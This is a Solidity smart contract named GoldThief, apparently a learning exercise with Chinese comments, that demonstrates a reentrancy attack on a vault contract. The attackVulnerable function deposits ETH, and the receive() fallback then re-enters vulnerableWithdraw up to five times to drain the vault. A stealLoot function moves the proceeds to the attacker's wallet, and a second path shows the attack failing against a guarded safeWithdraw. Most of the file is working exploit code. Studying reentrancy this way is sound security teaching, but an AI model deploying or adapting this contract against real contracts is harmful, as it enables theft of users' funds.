//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
  
    interface IVault {
        //接口是为了和之前的合约交互
        //只有框架的话就可以去进入合同了，调用这几个函数就ok
     function deposit() external payable;
     function vulnerableWithdraw() external;
     function safeWithdraw() external;
     //会不会阻止他
}

contract GoldThief {

    IVault public targetVault;
    //目标地址，但我们用了接口伪装，允许调用vault的函数
    address public owner;
    //主谋
    uint public attackCount;
    //攻击了几次，用此计数器来限制 fallback 函数回调文件库的次数
    bool public attackingSafe;
    //看攻击是否被阻止，false没被阻止就一直攻击
    constructor(address _vaultAddress) {
        //把这个要攻击的地址传进来
    targetVault = IVault(_vaultAddress);
    //转换成ivault然后对其操作
    owner = msg.sender;
}
    function attackVulnerable() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        //至少要有一个eth才能攻击，假装自己是普通用户 
        attackingSafe = false;
        attackCount = 0;
        //攻击很安全，易受攻击，就重新开始计数
        targetVault.deposit{value: msg.value}();
        //合法存入小偷的余额，更新在金库内部mapping中的余额
        //0就不能继续咯
        targetVault.vulnerableWithdraw();
        //把钱提出来，后面才会把余额设置为0

    }
    receive() external payable {
        //不会直接调用，自动触发，将 ETH 发送回时，Solidity 会在接收合约上查找以下两项之一
        //找这两个：receive/callback，所以写了receive
        attackCount++;
        //加计数
        if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
        targetVault.vulnerableWithdraw();
         }
    //攻击安全，库里有钱，5次攻击以内，就会再一次攻击
         
         if (attackingSafe) {
        targetVault.safeWithdraw(); 
        //试着重新进入取钱，但是失败了
        //因为modifier在起作用，会直接屏蔽掉这个操作
        //安全退出
    }
}

       function attackSafe() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        //相同的攻击逻辑，攻击安全的取款功能
    attackingSafe = true;
    attackCount = 0;
    //开始计数
    targetVault.deposit{value: msg.value}();
//存钱
    targetVault.safeWithdraw();
    //这个一定会失败，因为不能重新进入
    //把我们的账户余额设为0了已经，receive就被屏蔽
}
//转入个人钱包：
function stealLoot() external {
    require(msg.sender == owner, "Only owner");
    payable(owner).transfer(address(this).balance);
    //转账
}
function getBalance() external view returns (uint256) {
    return address(this).balance;
}
//只读，看下账户余额







}